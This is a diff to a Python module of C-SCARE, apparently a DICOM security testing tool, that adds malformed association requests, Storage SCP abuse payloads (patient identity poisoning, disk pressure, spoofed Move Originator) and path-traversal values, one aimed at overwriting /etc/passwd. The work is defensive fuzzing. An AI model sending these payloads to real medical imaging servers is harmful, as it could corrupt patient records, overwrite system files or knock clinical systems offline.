@@ -6,7 +6,7 @@ This module is a STATIC CATALOG of hand-built malformed DICOM payloads. It
 is not a fuzzing engine: there is no mutation loop and no coverage feedback.
 The catalog has two roles in C-SCARE:
   * Black-box DAST  - deliver payloads live at a target and watch for
-                      anomalies (see c_scare.deliver / test_runner).
+                      anomalies (see c_scare.deliver / runner).
   * Grey-box seeds  - write payloads to disk as the initial corpus for
                       AFL++ / AFLNet, which own the actual mutation loop.
 
@@ -20,6 +20,7 @@ Attack Categories:
     ProtocolAttacks    - Target network stack (PDUs, associations)
     MemoryAttacks      - Buffer overflows, allocation exhaustion
     LogicAttacks       - Semantic confusion, state violations
+    StorageSCPAbuseAttacks - Unauthenticated C-STORE import/storage abuse
     CommandInjectionAttacks - Shell injection via storescp exec placeholders
     PathTraversalAttacks - Directory traversal in stored DICOM filenames
     StateMachineAttacks - DICOM state machine (Sta1-Sta13) violations
@@ -43,6 +44,11 @@ Targeted (metadata['cve']):
     CVE-2024-33606  - SSRF via URI Value Representation
     CVE-2024-34509  - dcmdata segfault via invalid DIMSE message (black-box analogue)
     CVE-2026-5663   - OS command injection via storescp exec placeholders
+    CVE-2026-50003  - C-GET bit-preserving storage path traversal
+    CVE-2026-50254  - storescp association-request memory leak
+    CVE-2026-35505  - association-request memory leak in single-process SCPs
+    CVE-2026-52868  - worklist per-AE storage path traversal
+    CVE-2026-44628  - worklist crafted-query type confusion crash
     CVE-2015-8979   - DCMTK dcmnet/DUL string-handling overflow on the wire
                       (lineage: CVE-2019-1010228, CVE-2021-41689)
     CVE-2022-2121   - DCMTK NULL pointer dereference parsing a malformed file
@@ -71,6 +77,12 @@ Targeted (metadata['cve']):
     CVE-2026-5444   - Orthanc embedded-PAM image dimension overflow
     CVE-2026-5445   - Orthanc DecodeLookupTable palette index past LUT size
                       (Orthanc 5441..5445 are CERT/CC VU#536588, fixed in 1.12.11)
+    CVE-2026-50003  - DCMTK C-GET bit-preserving storage path traversal
+                      from a malicious SCP to a client/SCU
+    CVE-2026-50254  - DCMTK storescp crafted association request memory leak DoS
+    CVE-2026-35505  - DCMTK dcmnet crafted association request memory leak DoS
+    CVE-2026-52868  - DCMTK worklist filesystem cross-AE path traversal/read
+    CVE-2026-44628  - DCMTK worklist C-FIND type confusion crash
 
   Config-file CVEs exercised by the grey-box dcmqrscp track live under
   fuzz/configs/malformed/: CVE-2020-36855, CVE-2022-4981.
@@ -120,6 +132,7 @@ try:
         DEFAULT_TRANSFER_SYNTAX_UID, VERIFICATION_SOP_CLASS_UID,
         CT_IMAGE_STORAGE_SOP_CLASS_UID, IMPLEMENTATION_CLASS_UID,
         MR_IMAGE_STORAGE_SOP_CLASS_UID, SECONDARY_CAPTURE_SOP_CLASS_UID,
+        MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
         _uid_to_bytes,
     )
     SCAPY_DICOM_AVAILABLE = True
@@ -130,6 +143,7 @@ except Exception:
     CT_IMAGE_STORAGE_SOP_CLASS_UID = '1.2.840.10008.5.1.4.1.1.2'
     MR_IMAGE_STORAGE_SOP_CLASS_UID = '1.2.840.10008.5.1.4.1.1.4'
     SECONDARY_CAPTURE_SOP_CLASS_UID = '1.2.840.10008.5.1.4.1.1.7'
+    MODALITY_WORKLIST_FIND_SOP_CLASS_UID = '1.2.840.10008.5.1.4.32.1'
     IMPLEMENTATION_CLASS_UID = '1.2.3.4.5.6.7.8.9'
 
 try:
@@ -150,6 +164,7 @@ __all__ = [
     'ProtocolAttacks',
     'MemoryAttacks',
     'LogicAttacks',
+    'StorageSCPAbuseAttacks',
     'CommandInjectionAttacks',
     'PathTraversalAttacks',
     'StateMachineAttacks',
@@ -637,6 +652,74 @@ class ProtocolAttacks:
         )
 
     @staticmethod
+    def duplicate_presentation_context_id() -> AttackResult:
+        """A-ASSOCIATE-RQ with two Presentation Contexts using the same ID."""
+        variable_items = _item_bytes(0x10, b'1.2.840.10008.3.1.1.1')
+        variable_items += _presentation_context_bytes(
+            CT_IMAGE_STORAGE_SOP_CLASS_UID, context_id=1)
+        variable_items += _presentation_context_bytes(
+            MR_IMAGE_STORAGE_SOP_CLASS_UID, context_id=1)
+        variable_items += _user_information_bytes()
+        payload = _associate_rq_with_items('STORESCP', 'C-SCARE-FZ', variable_items)
+        return AttackResult(
+            name='duplicate_presentation_context_id',
+            category='protocol',
+            payload=payload,
+            description='A-ASSOCIATE-RQ reuses Presentation Context ID 1 for two SOP classes',
+            expected_behavior='Target should reject duplicate presentation context IDs',
+            metadata={'coverage_scope': 'association-presentation-context-id'},
+        )
+
+    @staticmethod
+    def even_presentation_context_id() -> AttackResult:
+        """A-ASSOCIATE-RQ with even Presentation Context ID."""
+        payload = _associate_rq_bytes(
+            'STORESCP', 'C-SCARE-FZ', CT_IMAGE_STORAGE_SOP_CLASS_UID,
+            context_id=2)
+        return AttackResult(
+            name='even_presentation_context_id',
+            category='protocol',
+            payload=payload,
+            description='A-ASSOCIATE-RQ uses even Presentation Context ID 2',
+            expected_behavior='Target should reject non-odd presentation context IDs',
+            metadata={'coverage_scope': 'association-presentation-context-id'},
+        )
+
+    @staticmethod
+    def presentation_context_without_transfer_syntax() -> AttackResult:
+        """A-ASSOCIATE-RQ with Abstract Syntax but no Transfer Syntax."""
+        pc_payload = bytes([1, 0, 0, 0])
+        pc_payload += _item_bytes(0x30, CT_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii'))
+        variable_items = _item_bytes(0x10, b'1.2.840.10008.3.1.1.1')
+        variable_items += _item_bytes(0x20, pc_payload)
+        variable_items += _user_information_bytes()
+        payload = _associate_rq_with_items('STORESCP', 'C-SCARE-FZ', variable_items)
+        return AttackResult(
+            name='presentation_context_without_transfer_syntax',
+            category='protocol',
+            payload=payload,
+            description='A-ASSOCIATE-RQ Storage context has no Transfer Syntax item',
+            expected_behavior='Target should reject incomplete presentation context',
+            metadata={'coverage_scope': 'association-presentation-context-items'},
+        )
+
+    @staticmethod
+    def tiny_max_pdu_length() -> AttackResult:
+        """A-ASSOCIATE-RQ negotiates an impractically tiny Max PDU Length."""
+        user_info = _item_bytes(0x51, struct.pack('!I', 1))
+        payload = _associate_rq_bytes(
+            'STORESCP', 'C-SCARE-FZ', CT_IMAGE_STORAGE_SOP_CLASS_UID,
+            user_info_payload=user_info)
+        return AttackResult(
+            name='tiny_max_pdu_length',
+            category='protocol',
+            payload=payload,
+            description='A-ASSOCIATE-RQ offers Maximum Length of one byte',
+            expected_behavior='Target should reject or safely clamp tiny Max PDU Length',
+            metadata={'coverage_scope': 'association-user-information'},
+        )
+
+    @staticmethod
     def pdu_length_mismatch(inflate_by: int = 10000) -> AttackResult:
         """A-ASSOCIATE-RQ with length field inflated."""
         if not SCAPY_AVAILABLE:
@@ -736,6 +819,10 @@ class ProtocolAttacks:
         yield cls.overlong_ae_title()
         yield cls.null_ae_titles()
         yield cls.missing_application_context()
+        yield cls.duplicate_presentation_context_id()
+        yield cls.even_presentation_context_id()
+        yield cls.presentation_context_without_transfer_syntax()
+        yield cls.tiny_max_pdu_length()
         yield cls.pdu_length_mismatch()
         yield cls.abort_injection()
         yield cls.wrong_context_id()
@@ -1125,6 +1212,249 @@ def _payload_lookup(payloads, payload_id: str, kind: str) -> Tuple[str, str]:
 
 
 # =============================================================================
+# Storage SCP Abuse - unauthenticated C-STORE import/storage side effects
+# =============================================================================
+
+class StorageSCPAbuseAttacks:
+    """
+    Attacks targeting the broader unauthenticated Storage SCP surface.
+
+    These are not path traversal payloads. They probe what happens when any
+    same-network peer can push objects into storage/import/database workflows:
+    identity validation, command-vs-dataset consistency, SOP class confusion,
+    disk pressure, and private-tag pressure.
+
+    Pure payload generators - no network I/O. Deliver with C-STORE; metadata
+    carries the Storage SOP Class, SOP Instance UID, and the coverage axis.
+    """
+
+    @staticmethod
+    def empty_required_identity_store() -> AttackResult:
+        """Store object with empty Patient Name and Patient ID."""
+        ds = _injection_base_dataset()
+        ds[0x00100010] = Element(0x0010, 0x0010, 'PN', '')
+        ds[0x00100020] = Element(0x0010, 0x0020, 'LO', '')
+        return AttackResult(
+            name='storage_empty_required_identity',
+            category='storage_abuse',
+            payload=ds.encode(),
+            description='C-STORE object with both Patient Name and Patient ID empty',
+            expected_behavior='Storage SCP should reject, quarantine, or import '
+                              'without creating ambiguous patient records',
+            metadata={
+                'coverage_scope': 'identity-validation',
+                'target_fields': ['(0010,0010) Patient Name', '(0010,0020) Patient ID'],
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def duplicate_patient_identity_conflict() -> AttackResult:
+        """Store object with duplicate conflicting patient identity tags."""
+        ds = Dataset()
+        ds._force_append(Element(0x0008, 0x0016, 'UI', SECONDARY_CAPTURE_SOP_CLASS_UID))
+        ds._force_append(Element(0x0008, 0x0018, 'UI', '1.2.3.4.5.30'))
+        ds._force_append(Element(0x0008, 0x0060, 'CS', 'OT'))
+        ds._force_append(Element(0x0010, 0x0010, 'PN', 'Trusted^Patient'))
+        ds._force_append(Element(0x0010, 0x0010, 'PN', 'Injected^Patient'))
+        ds._force_append(Element(0x0010, 0x0020, 'LO', 'TRUSTED-ID'))
+        ds._force_append(Element(0x0010, 0x0020, 'LO', 'INJECTED-ID'))
+        ds._force_append(Element(0x0020, 0x000D, 'UI', '1.2.3.4.5.30.1'))
+        ds._force_append(Element(0x0020, 0x000E, 'UI', '1.2.3.4.5.30.2'))
+        return AttackResult(
+            name='storage_duplicate_patient_identity_conflict',
+            category='storage_abuse',
+            payload=ds.encode(),
+            description='C-STORE object with duplicate conflicting patient identity tags',
+            expected_behavior='Storage/import path should reject or deterministically '
+                              'resolve duplicate identities without patient merge poison',
+            metadata={
+                'coverage_scope': 'identity-merge-poisoning',
+                'target_fields': ['(0010,0010) Patient Name', '(0010,0020) Patient ID'],
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5.30',
+            },
+        )
+
+    @staticmethod
+    def command_dataset_sop_class_conflict() -> AttackResult:
+        """Command Storage SOP class differs from dataset SOP Class UID."""
+        ds = _injection_base_dataset()
+        ds[0x00080016] = Element(0x0008, 0x0016, 'UI', MR_IMAGE_STORAGE_SOP_CLASS_UID)
+        return AttackResult(
+            name='storage_command_dataset_sop_class_conflict',
+            category='storage_abuse',
+            payload=ds.encode(),
+            description='C-STORE command says Secondary Capture while dataset claims MR Image Storage',
+            expected_behavior='Storage SCP should reject or quarantine SOP class mismatch',
+            metadata={
+                'coverage_scope': 'command-dataset-sop-class-mismatch',
+                'command_sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'dataset_sop_class_uid': MR_IMAGE_STORAGE_SOP_CLASS_UID,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def command_dataset_instance_uid_conflict() -> AttackResult:
+        """Command Affected SOP Instance UID differs from dataset SOP Instance UID."""
+        ds = _injection_base_dataset()
+        ds[0x00080018] = Element(0x0008, 0x0018, 'UI', '1.2.3.4.5.31')
+        return AttackResult(
+            name='storage_command_dataset_instance_uid_conflict',
+            category='storage_abuse',
+            payload=ds.encode(),
+            description='C-STORE command and dataset carry different SOP Instance UIDs',
+            expected_behavior='Storage SCP should reject or handle UID mismatch deterministically',
+            metadata={
+                'coverage_scope': 'command-dataset-instance-uid-mismatch',
+                'command_sop_instance_uid': '1.2.3.4.5',
+                'dataset_sop_instance_uid': '1.2.3.4.5.31',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def bulkdata_disk_pressure(size: int = 256 * 1024) -> AttackResult:
+        """Store object with a larger raw Pixel Data value for storage pressure."""
+        ds = _injection_base_dataset()
+        ds = ds / Element(0x0028, 0x0010, 'US', 512)
+        ds = ds / Element(0x0028, 0x0011, 'US', 512)
+        ds = ds / Element(0x0028, 0x0100, 'US', 8)
+        ds = ds / Element(0x7FE0, 0x0010, 'OB', b'X' * size)
+        return AttackResult(
+            name='storage_bulkdata_disk_pressure',
+            category='storage_abuse',
+            payload=ds.encode(),
+            description=f'C-STORE object with {size} bytes of raw Pixel Data',
+            expected_behavior='Storage SCP should enforce quotas and remain available under repeated stores',
+            metadata={
+                'coverage_scope': 'storage-quota-disk-pressure',
+                'size': size,
+                'repeat_for_detection': 100,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def private_tag_pressure(count: int = 128) -> AttackResult:
+        """Store object with many private tags for scanner/import pressure."""
+        ds = _injection_base_dataset()
+        ds = ds / Element(0x0011, 0x0010, 'LO', 'C-SCARE')
+        for i in range(count):
+            ds = ds / Element(0x0011, 0x1000 + i, 'LO', f'private-{i:03d}')
+        return AttackResult(
+            name='storage_private_tag_pressure',
+            category='storage_abuse',
+            payload=ds.encode(),
+            description=f'C-STORE object with {count} private data elements',
+            expected_behavior='Storage/import path should bound private-tag processing and metadata insertion',
+            metadata={
+                'coverage_scope': 'private-tag-metadata-pressure',
+                'private_tag_count': count,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def cstore_no_dataset_flag_with_data() -> AttackResult:
+        """C-STORE command says no dataset while data PDV is present."""
+        ds = _injection_base_dataset()
+        payload, steps = _cstore_sequence_bytes(
+            dataset=ds.encode(), data_set_type=0x0101)
+        return AttackResult(
+            name='storage_cstore_no_dataset_flag_with_data',
+            category='storage_abuse',
+            payload=payload,
+            description='C-STORE-RQ Data Set Type says no dataset but a data PDV follows',
+            expected_behavior='Storage SCP should reject inconsistent C-STORE command/data state',
+            metadata={
+                'coverage_scope': 'cstore-command-data-set-type-mismatch',
+                'steps': steps,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def cstore_dataset_flag_without_data() -> AttackResult:
+        """C-STORE command says dataset present but no data PDV follows."""
+        payload, steps = _cstore_sequence_bytes(dataset=None, data_set_type=0x0000)
+        return AttackResult(
+            name='storage_cstore_dataset_flag_without_data',
+            category='storage_abuse',
+            payload=payload,
+            description='C-STORE-RQ Data Set Type says dataset present but no data PDV follows',
+            expected_behavior='Storage SCP should not create partial files or database rows',
+            metadata={
+                'coverage_scope': 'cstore-missing-data-pdv',
+                'steps': steps,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def cstore_invalid_priority_with_dataset() -> AttackResult:
+        """C-STORE command uses an out-of-range Priority value."""
+        ds = _injection_base_dataset()
+        payload, steps = _cstore_sequence_bytes(dataset=ds.encode(), priority=0xFFFF)
+        return AttackResult(
+            name='storage_cstore_invalid_priority_with_dataset',
+            category='storage_abuse',
+            payload=payload,
+            description='C-STORE-RQ uses invalid Priority value 0xFFFF with dataset',
+            expected_behavior='Storage SCP should reject or ignore invalid priority safely',
+            metadata={
+                'coverage_scope': 'cstore-invalid-priority',
+                'steps': steps,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def cstore_move_originator_spoof() -> AttackResult:
+        """C-STORE command includes spoofed Move Originator fields."""
+        ds = _injection_base_dataset()
+        payload, steps = _cstore_sequence_bytes(
+            dataset=ds.encode(), move_originator_ae_title='ATTACKER',
+            move_originator_message_id=0xFFFF)
+        return AttackResult(
+            name='storage_cstore_move_originator_spoof',
+            category='storage_abuse',
+            payload=payload,
+            description='Standalone C-STORE-RQ carries spoofed Move Originator fields',
+            expected_behavior='Storage SCP should not trust Move Originator fields for authorization or routing',
+            metadata={
+                'coverage_scope': 'cstore-move-originator-spoofing',
+                'steps': steps,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @classmethod
+    def all(cls) -> Generator[AttackResult, None, None]:
+        """Yield every Storage SCP abuse payload."""
+        yield cls.empty_required_identity_store()
+        yield cls.duplicate_patient_identity_conflict()
+        yield cls.command_dataset_sop_class_conflict()
+        yield cls.command_dataset_instance_uid_conflict()
+        yield cls.bulkdata_disk_pressure()
+        yield cls.private_tag_pressure()
+        yield cls.cstore_no_dataset_flag_with_data()
+        yield cls.cstore_dataset_flag_without_data()
+        yield cls.cstore_invalid_priority_with_dataset()
+        yield cls.cstore_move_originator_spoof()
+
+
+# =============================================================================
 # Command Injection Attacks - shell metacharacters in storescp exec placeholders
 # =============================================================================
 
@@ -1229,6 +1559,7 @@ class CommandInjectionAttacks:
                 'requires_option': '--exec-on-* with --sort-on-study-uid (-su)',
                 'target_field': '(0020,000D) Study Instance UID',
                 'shell_payload': suffix,
+                'study_instance_uid': malicious,
                 'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                 'sop_instance_uid': '1.2.3.4.5',
             },
@@ -1259,6 +1590,7 @@ class CommandInjectionAttacks:
                 'requires_option': '--exec-on-* with --sort-on-patientname (-sp)',
                 'target_field': '(0010,0010) Patient Name',
                 'shell_payload': suffix,
+                'patient_name': malicious,
                 'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                 'sop_instance_uid': '1.2.3.4.5',
             },
@@ -1315,15 +1647,35 @@ class PathTraversalAttacks:
     _TRAVERSAL_PAYLOADS = [
         ('posix',    '../../../../../../tmp/c-scare-traversal',
          'POSIX relative traversal'),
+        ('posix_proof', '../../../../../../tmp/c-scare-traversal-proof',
+         'POSIX relative traversal with an unambiguous proof canary'),
+        ('etc_passwd', '../../../../../../etc/passwd',
+         'POSIX relative traversal targeting /etc/passwd overwrite'),
+        ('null_byte', '../../../../../../tmp/attacker-controlled.attacker\x00.DCM',
+         'POSIX traversal with attacker-controlled extension before NUL truncation'),
+        ('ui_pad_nul', '../../../../../../tmp/c-scare-ui-pad0',
+         'odd-length UI traversal relying on DICOM NUL padding'),
+        ('overlong_uid', '../../../../../../tmp/c-scare-' + ('A' * 80),
+         'over-64-character UI traversal value'),
+        ('vm_first', '../../../../../../tmp/c-scare-vm-first\\1.2.3.4.5',
+         'VM separator with malicious first SOP Instance UID value'),
+        ('vm_second', '1.2.3.4.5\\../../../../../../tmp/c-scare-vm-second',
+         'VM separator with malicious second SOP Instance UID value'),
         ('windows',  '..\\..\\..\\..\\..\\..\\Windows\\Temp\\c-scare-traversal',
          'Windows relative traversal'),
-        ('absolute', '/tmp/c-scare-traversal/escaped',
+        ('windows_absolute', 'C:\\Windows\\Temp\\c-scare-traversal',
+         'Windows drive-absolute path escaping the storage root'),
+        ('unc', '\\\\localhost\\share\\c-scare-traversal',
+         'Windows UNC path escaping the storage root'),
+        ('absolute', '/tmp/c-scare-traversal',
          'absolute path escaping the storage root'),
         ('mixed',    '..\\../..\\../..\\../c-scare-traversal',
          'mixed forward/back separators'),
         ('encoded',  '..%2f..%2f..%2f..%2fc-scare-traversal',
          'URL-encoded traversal sequence'),
     ]
+
+    _MULTI_FIELD_PROOF_ROOT = '../../../../../../tmp/c-scare-traversal-proof'
 
     @classmethod
     def _lookup(cls, payload_id: str) -> Tuple[str, str]:
@@ -1345,10 +1697,170 @@ class PathTraversalAttacks:
                               'before naming the received file',
             metadata={
                 'cve': 'CVE-2022-2119',
+                'cves': ['CVE-2022-2119', 'CVE-2022-2120'],
+                'coverage_scope': 'dataset-and-command-sop-instance-uid',
                 'target_field': '(0008,0018) SOP Instance UID',
                 'traversal_payload': value,
+                'regression_case': 'null-byte-extension-bypass'
+                                   if payload_id == 'null_byte' else None,
+                'dicom_ui_boundary': payload_id if payload_id in (
+                    'null_byte', 'ui_pad_nul', 'overlong_uid') else None,
+                'dicom_vm_boundary': payload_id if payload_id in (
+                    'vm_first', 'vm_second') else None,
+                'vm_separator': payload_id in ('vm_first', 'vm_second'),
+                'null_byte_filename_truncation': payload_id in (
+                    'null_byte', 'ui_pad_nul'),
+                'overlong_uid': payload_id == 'overlong_uid',
+                'attacker_controlled_extension': '.attacker'
+                                                 if payload_id == 'null_byte'
+                                                 else None,
+                'extension_bypass': '.DCM suffix may be hidden behind embedded NUL'
+                                    if payload_id in ('null_byte', 'ui_pad_nul')
+                                    else None,
                 'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                 'sop_instance_uid': value,
+            },
+        )
+
+    @classmethod
+    def command_sop_instance_uid_traversal(cls,
+                                           payload_id: str = 'null_byte') -> AttackResult:
+        """Path traversal in C-STORE command Affected SOP Instance UID only.
+
+        Some receivers derive the stored filename from the DIMSE command set
+        instead of the dataset value. This keeps the dataset SOP Instance UID
+        benign while sending the malicious value as (0000,1000).
+        """
+        value, note = cls._lookup(payload_id)
+        ds = _injection_base_dataset()
+        return AttackResult(
+            name=f'path_traversal_command_sop_uid_{payload_id}',
+            category='path_traversal',
+            payload=ds.encode(),
+            description=f'C-STORE command Affected SOP Instance UID carries a {note}',
+            expected_behavior='Receiver must sanitise the command SOP Instance UID '
+                              'before naming the received file',
+            metadata={
+                'cve': 'CVE-2022-2119',
+                'cves': ['CVE-2022-2119', 'CVE-2022-2120'],
+                'coverage_scope': 'command-sop-instance-uid-only',
+                'target_field': '(0000,1000) Affected SOP Instance UID',
+                'dataset_sop_instance_uid': '1.2.3.4.5',
+                'traversal_payload': value,
+                'regression_case': 'null-byte-extension-bypass'
+                                   if payload_id == 'null_byte' else None,
+                'dicom_ui_boundary': payload_id if payload_id in (
+                    'null_byte', 'ui_pad_nul', 'overlong_uid') else None,
+                'dicom_vm_boundary': payload_id if payload_id in (
+                    'vm_first', 'vm_second') else None,
+                'vm_separator': payload_id in ('vm_first', 'vm_second'),
+                'null_byte_filename_truncation': payload_id in (
+                    'null_byte', 'ui_pad_nul'),
+                'overlong_uid': payload_id == 'overlong_uid',
+                'attacker_controlled_extension': '.attacker'
+                                                 if payload_id == 'null_byte'
+                                                 else None,
+                'extension_bypass': '.DCM suffix may be hidden behind embedded NUL'
+                                    if payload_id in ('null_byte', 'ui_pad_nul')
+                                    else None,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': value,
+            },
+        )
+
+    @classmethod
+    def dataset_only_sop_instance_uid_traversal(
+            cls, payload_id: str = 'null_byte') -> AttackResult:
+        """Path traversal in dataset SOP Instance UID only.
+
+        This keeps the DIMSE command Affected SOP Instance UID benign so a
+        receiver that compares command-vs-dataset UIDs must reject or sanitise
+        the dataset value before any filesystem write.
+        """
+        value, note = cls._lookup(payload_id)
+        ds = _injection_base_dataset()
+        ds[0x00080018] = Element(0x0008, 0x0018, 'UI', value)
+        return AttackResult(
+            name=f'path_traversal_dataset_only_sop_uid_{payload_id}',
+            category='path_traversal',
+            payload=ds.encode(),
+            description=f'Dataset SOP Instance UID carries a {note} while the '
+                        'C-STORE command UID stays benign',
+            expected_behavior='Receiver must reject mismatched unsafe UIDs or '
+                              'sanitise before naming the received file',
+            metadata={
+                'cve': 'CVE-2022-2119',
+                'cves': ['CVE-2022-2119', 'CVE-2022-2120'],
+                'coverage_scope': 'dataset-sop-instance-uid-only',
+                'target_field': '(0008,0018) SOP Instance UID',
+                'dataset_sop_instance_uid': value,
+                'command_sop_instance_uid': '1.2.3.4.5',
+                'traversal_payload': value,
+                'regression_case': 'null-byte-extension-bypass'
+                                   if payload_id == 'null_byte' else None,
+                'dicom_ui_boundary': payload_id if payload_id in (
+                    'null_byte', 'ui_pad_nul', 'overlong_uid') else None,
+                'dicom_vm_boundary': payload_id if payload_id in (
+                    'vm_first', 'vm_second') else None,
+                'vm_separator': payload_id in ('vm_first', 'vm_second'),
+                'null_byte_filename_truncation': payload_id in (
+                    'null_byte', 'ui_pad_nul'),
+                'overlong_uid': payload_id == 'overlong_uid',
+                'attacker_controlled_extension': '.attacker'
+                                                 if payload_id == 'null_byte'
+                                                 else None,
+                'extension_bypass': '.DCM suffix may be hidden behind embedded NUL'
+                                    if payload_id in ('null_byte', 'ui_pad_nul')
+                                    else None,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @classmethod
+    def file_meta_sop_instance_uid_traversal(
+            cls, payload_id: str = 'null_byte') -> AttackResult:
+        """Path traversal in illegal-on-network File Meta SOP Instance UID.
+
+        Network C-STORE datasets should not contain group 0002 file meta, but
+        this probes receivers that accidentally parse (0002,0003) and use it
+        for storage naming anyway.
+        """
+        value, note = cls._lookup(payload_id)
+        ds = _injection_base_dataset()
+        ds._force_append(Element(0x0002, 0x0003, 'UI', value))
+        return AttackResult(
+            name=f'path_traversal_file_meta_sop_uid_{payload_id}',
+            category='path_traversal',
+            payload=ds.encode(),
+            description=f'File Meta Media Storage SOP Instance UID carries a {note}',
+            expected_behavior='Receiver must ignore illegal network file meta or '
+                              'sanitise before naming the received file',
+            metadata={
+                'cve': 'CVE-2022-2119',
+                'cves': ['CVE-2022-2119', 'CVE-2022-2120'],
+                'coverage_scope': 'file-meta-sop-instance-uid',
+                'target_field': '(0002,0003) Media Storage SOP Instance UID',
+                'dataset_sop_instance_uid': '1.2.3.4.5',
+                'traversal_payload': value,
+                'regression_case': 'null-byte-extension-bypass'
+                                   if payload_id == 'null_byte' else None,
+                'dicom_ui_boundary': payload_id if payload_id in (
+                    'null_byte', 'ui_pad_nul', 'overlong_uid') else None,
+                'dicom_vm_boundary': payload_id if payload_id in (
+                    'vm_first', 'vm_second') else None,
+                'vm_separator': payload_id in ('vm_first', 'vm_second'),
+                'null_byte_filename_truncation': payload_id in (
+                    'null_byte', 'ui_pad_nul'),
+                'overlong_uid': payload_id == 'overlong_uid',
+                'attacker_controlled_extension': '.attacker'
+                                                 if payload_id == 'null_byte'
+                                                 else None,
+                'extension_bypass': '.DCM suffix may be hidden behind embedded NUL'
+                                    if payload_id in ('null_byte', 'ui_pad_nul')
+                                    else None,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
             },
         )
 
@@ -1405,16 +1917,79 @@ class PathTraversalAttacks:
         )
 
     @classmethod
+    def multi_field_storage_path_probe(cls) -> AttackResult:
+        """Put one proof canary across every common storage-naming field.
+
+        This is a benign proof-of-impact payload: a vulnerable receiver may
+        write a DICOM object or storage directory under the canary path, while a
+        partially sanitising receiver often leaves the canary text inside its
+        storage root. Either outcome is easy to distinguish from generic import
+        noise and identify in DUT-side filesystem monitoring.
+        """
+        root = cls._MULTI_FIELD_PROOF_ROOT
+        overrides = {
+            'SOPInstanceUID': f'{root}/sop-instance',
+            'StudyInstanceUID': f'{root}/study-instance',
+            'SeriesInstanceUID': f'{root}/series-instance',
+            'PatientName': f'{root}/patient-name',
+            'PatientID': 'CSCARE-PATH-PROOF',
+        }
+        ds = _injection_base_dataset()
+        ds[0x00080018] = Element(0x0008, 0x0018, 'UI', overrides['SOPInstanceUID'])
+        ds[0x0020000D] = Element(0x0020, 0x000D, 'UI', overrides['StudyInstanceUID'])
+        ds[0x0020000E] = Element(0x0020, 0x000E, 'UI', overrides['SeriesInstanceUID'])
+        ds[0x00100010] = Element(0x0010, 0x0010, 'PN', overrides['PatientName'])
+        ds[0x00100020] = Element(0x0010, 0x0020, 'LO', overrides['PatientID'])
+        return AttackResult(
+            name='path_traversal_multi_field_storage_probe',
+            category='path_traversal',
+            payload=ds.encode(),
+            description='SOP, Study, Series, and Patient fields carry the same '
+                        'path traversal proof canary',
+            expected_behavior='Receiver must reject the object or prove every '
+                              'storage path is canonicalised inside the intended '
+                              'root before filesystem writes occur',
+            metadata={
+                'cve': 'CVE-2022-2119',
+                'cves': ['CVE-2022-2119', 'CVE-2022-2120'],
+                'coverage_scope': 'multi-field-storage-path-proof',
+                'target_fields': [
+                    '(0008,0018) SOP Instance UID',
+                    '(0020,000D) Study Instance UID',
+                    '(0020,000E) Series Instance UID',
+                    '(0010,0010) Patient Name',
+                    '(0010,0020) Patient ID',
+                ],
+                'traversal_payload': root,
+                'proof_canary_leaf': 'c-scare-traversal-proof',
+                'expected_escape_prefixes': [
+                    '/tmp/c-scare-traversal-proof',
+                    '/var/tmp/c-scare-traversal-proof',
+                ],
+                'sanitized_storage_marker': 'c-scare-traversal-proof',
+                'cstore_field_overrides': overrides,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': overrides['SOPInstanceUID'],
+            },
+        )
+
+    @classmethod
     def all(cls) -> Generator[AttackResult, None, None]:
         """Yield every path-traversal attack payload."""
         # SOP Instance UID always names the received file: full sweep.
         for pid, _value, _note in cls._TRAVERSAL_PAYLOADS:
             yield cls.sop_instance_uid_traversal(pid)
+        yield cls.multi_field_storage_path_probe()
+        # Filename source ambiguity: command-only, dataset-only, and illegal
+        # file-meta variants for the highest-risk null-byte extension-bypass shape.
+        yield cls.command_sop_instance_uid_traversal('null_byte')
+        yield cls.dataset_only_sop_instance_uid_traversal('null_byte')
+        yield cls.file_meta_sop_instance_uid_traversal('null_byte')
         # Study Instance UID names the per-study dir (needs -su).
-        for pid in ('posix', 'windows', 'absolute'):
+        for pid in ('posix', 'windows', 'windows_absolute', 'absolute'):
             yield cls.study_instance_uid_traversal(pid)
         # Patient Name names the per-patient dir (needs -sp).
-        for pid in ('posix', 'windows', 'absolute'):
